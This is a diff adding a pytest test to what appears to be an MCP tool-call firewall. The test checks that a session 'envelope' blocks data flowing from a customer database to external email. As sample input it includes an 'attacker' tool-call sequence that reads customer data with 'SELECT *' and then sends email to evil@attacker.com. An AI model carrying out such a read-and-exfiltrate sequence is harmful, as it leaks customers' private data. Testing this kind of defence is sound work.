@@ -79,3 +79,54 @@ def test_parse_listen():
     assert _parse_listen(":8443") == ("0.0.0.0", 8443)
     assert _parse_listen("127.0.0.1:8443") == ("127.0.0.1", 8443)
     assert _parse_listen("8443") == ("0.0.0.0", 8443)
+
+
+def test_envelope_blocks_on_data_flow(audit, tmp_path):
+    """Envelope catches cross-action data flow that per-call policy allows."""
+    from mcpfw.policy import load_policy
+
+    # Use permissive policy (allows everything at per-call layer)
+    permissive = tmp_path / "permissive.yaml"
+    permissive.write_text("name: permissive\nrules:\n  - action: allow\n    tools: ['*']\n")
+    policy = load_policy(str(permissive))
+
+    # Create envelope with forbidden flow
+    envelope_yaml = tmp_path / "envelope.yaml"
+    envelope_yaml.write_text("""
+name: test-envelope
+bounds:
+  max_actions_per_session: 50
+  max_tokens_consumed: 100000
+  max_duration_seconds: 300
+  max_cost_usd: 10.0
+  data_flow:
+    forbidden_flows:
+      - from: "customer_db"
+        to: ["email_external"]
+""")
+
+    proxy = HttpProxy(
+        target="http://localhost:9999",
+        policy=policy,
+        audit=audit,
+        envelope_path=str(envelope_yaml),
+    )
+
+    session = proxy._get_session("attacker")
+
+    # Step 1: Read customer data (passes both layers, fails on forward which is fine)
+    msg1 = {"jsonrpc": "2.0", "id": 1, "method": "tools/call",
+            "params": {"name": "read_db", "arguments": {"query": "SELECT *", "__data_read": ["customer_db"]}}}
+    r1 = asyncio.run(proxy._process_request(json.dumps(msg1).encode(), session, "attacker"))
+    resp1 = json.loads(r1)
+    # Should NOT be blocked by envelope (just a read)
+    assert "BLOCKED by envelope" not in resp1.get("error", {}).get("message", "")
+
+    # Step 2: Write to forbidden destination (envelope should KILL)
+    msg2 = {"jsonrpc": "2.0", "id": 2, "method": "tools/call",
+            "params": {"name": "send_email", "arguments": {"to": "evil@attacker.com", "__data_write": ["email_external"]}}}
+    r2 = asyncio.run(proxy._process_request(json.dumps(msg2).encode(), session, "attacker"))
+    resp2 = json.loads(r2)
+
+    assert "error" in resp2
+    assert "BLOCKED by envelope" in resp2["error"]["message"]
